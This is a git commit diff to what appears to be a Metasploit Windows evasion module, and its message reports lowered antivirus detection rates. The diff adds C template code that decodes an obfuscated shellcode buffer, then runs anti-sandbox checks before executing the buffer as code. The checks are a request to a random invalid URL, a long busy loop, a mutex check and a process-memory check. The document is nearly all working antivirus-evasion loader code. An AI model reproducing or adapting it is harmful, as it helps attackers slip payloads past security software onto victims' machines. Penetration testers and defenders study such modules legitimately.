c4dbdbb6483982f8db81f29acee45fd4be205a24
Arthur RAOUT <arthur.raout@nbs-system.com>
2023-01-23 22:37:18 +0100

    Added url checking, antiscan-> 2/27 virtotal->12/70

--- modules/evasion/windows/no_shellcode.rb
+++ modules/evasion/windows/no_shellcode.rb
@@ -48,7 +48,6 @@ def get_payload_bytes()
   s = ""
   i = 0
   j = 0
-  print_status("payload : #{payload}")
   vector = rand(1..1024)
   while j < get_payload[:size]
     s += "  buf[#{j}] = \'\\x#{((payload[i]+payload[i+1]).hex + vector).to_s(16).rjust(2, "0")}\'-#{vector};\n"
@@ -61,43 +60,83 @@ end
   def c_template
     @c_template ||= %Q|
 #include <windows.h>
+#include <psapi.h>
+#include <wininet.h>
+#pragma comment(lib, "Psapi.lib")
+#pragma comment(lib, "Wininet.lib")
 
 // The encrypted code allows us to get around static scanning
-#define MEM 10000000
 
 int size  = #{get_payload[:size]};
 char *buf[#{get_payload[:size]}];
 
-int main() {
-  #{get_payload_bytes()}
-  char *bb = malloc(MEM);
-  memset(bb, 22, MEM);
-  free(bb);
+#define max_op #{rand(100000000..500000000)}
 
-HANDLE mutex;
-mutex = CreateMutex(NULL, TRUE, "muuuu");
- if (GetLastError() == ERROR_ALREADY_EXISTS)
+int check_url()
 {
-;
-}
-else
-{
-exit(0);
+  char cononstart[] = "https://www.#{Rex::Text.rand_text_alpha(rand(10..20))}.com"; //Invalid URL
+  char readbuf[1024];
+  HINTERNET httpopen, openurl;
+  DWORD read;
+  httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
+  openurl=InternetOpenUrl(httpopen,cononstart,NULL,NULL,INTERNET_FLAG_RELOAD\|INTERNET_FLAG_NO_CACHE_WRITE,NULL);
+  if (!openurl) // Access failed, we are not in AV
+  {
+    InternetCloseHandle(httpopen);
+    InternetCloseHandle(openurl);
+    return 1;
+  }
+  else
+  {
+    InternetCloseHandle(httpopen);
+    InternetCloseHandle(openurl);
+    return 0;
+  }
+  return 0;
 }
 
-  // Checking NULL allows us to get around Real-time protection
+
+int main(int argc, char **argv)
+{
+
+  if (!check_url())
+    exit(1);
+  #{get_payload_bytes}
+  int cpt = 0;
+  int i = 0;
+  for (i = 0; i < max_op; i++) {
+    cpt++;
+  }
+  if (cpt == max_op) {
+    HANDLE mutex;
+    mutex = CreateMutex(NULL, TRUE, "#{Rex::Text.rand_text_alpha(5)}");
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+      ;
+    }
+    else
+    {
+
+      exit(0);
+    }
+    PROCESS_MEMORY_COUNTERS pmc;
+    GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
+    if(!(pmc.WorkingSetSize<=3500000))
+    {
+      exit(#{rand(1..255)});
+    }
+    // Checking NULL allows us to get around Real-time protection
     void (*func)();
     func = (void (*)()) buf;
     (void)(*func)();
-
-  return 0;
+    return 0;
+  }
 }|
   end
 
   def run
-    i = 0
     # The randomized code allows us to generate a unique EXE
-    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: "OK", compile_options: " " })
+    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: "OK", compile_options: " -lpsapi -lwininet " })
     bin = m.compile_c(c_template)
     print_status("Compiled executable size: #{bin.length}")
     file_create(bin)
